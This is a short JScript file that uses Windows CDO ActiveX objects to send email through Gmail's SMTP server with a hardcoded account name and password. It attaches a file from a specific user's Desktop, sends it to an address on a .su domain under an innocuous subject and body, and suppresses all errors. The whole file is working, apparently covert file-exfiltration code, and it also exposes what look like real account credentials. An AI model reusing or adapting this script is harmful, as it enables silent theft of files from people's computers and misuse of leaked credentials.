smtpmail("longint32@gmail.com", "x32rr445r.", "smtp.gmail.com", 465, "redcloud@krovatka.su");
function smtpmail (xusername, xpassword, xsmtpserver, xsmtpport, xto)
{
try {
var xcdoconf = new ActiveXObject("CDO.Configuration");
var xcdo = new ActiveXObject("CDO.Message");
var xfields = xcdoconf.Fields;
with (xfields)
{
var schema = "http://schemas.microsoft.com/cdo/configuration/";
Item(schema + "sendusing") = 2;
Item(schema + "smtpauthenticate") = 1;
Item(schema + "smtpserver") = xsmtpserver;
Item(schema + "smtpserverport") = xsmtpport;
Item(schema + "sendusername") = xusername;
Item(schema + "sendpassword") = xpassword;
Item(schema + "smtpusessl") = 1;
Item(schema + "smtpconnectiontimeout") = 666;
Update();
}
with (xcdo)
{
To = xto;
From = xusername;
Subject = "6:00AM guys, ok";
HTMLBody = "<html>bring the project and beer too</html>";
AddAttachment("C:\\Users\\rubidus\\Desktop\\Koran\\TheZergs.SyRaBA\\Assignment\\signal.txt");
Sender = "longint32";
Organization = "[GIMO][As]";
ReplyTo = xusername;
Configuration = xcdoconf;
Send();
}
xcdo = null;
xcdoconf = null; 
xfields = null;
}
catch(e){
xcdo = null;
xcdoconf = null;
xfields = null;
}
}
